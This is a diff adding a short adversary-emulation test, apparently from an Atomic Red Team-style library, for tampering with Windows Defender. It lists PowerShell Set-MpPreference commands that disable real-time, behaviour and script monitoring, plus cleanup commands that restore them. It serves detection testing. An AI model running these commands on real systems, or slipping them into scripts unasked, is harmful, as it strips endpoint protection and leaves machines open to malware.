@@ -1,0 +1,18 @@
+#TechniqueName: Impair Defenses: Disable or Modify Tools
+#AtomicTestName: Tamper with Windows Defender ATP PowerShell
+#Description: Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled&in Windows settings.&
+#Language: ps1
+
+#commands
+Set-MpPreference -DisableRealtimeMonitoring 1
+Set-MpPreference -DisableBehaviorMonitoring 1
+Set-MpPreference -DisableScriptScanning 1
+Set-MpPreference -DisableBlockAtFirstSeen 1
+
+
+#cleanup_commands
+Set-MpPreference -DisableRealtimeMonitoring 0
+Set-MpPreference -DisableBehaviorMonitoring 0
+Set-MpPreference -DisableScriptScanning 0
+Set-MpPreference -DisableBlockAtFirstSeen 0
+
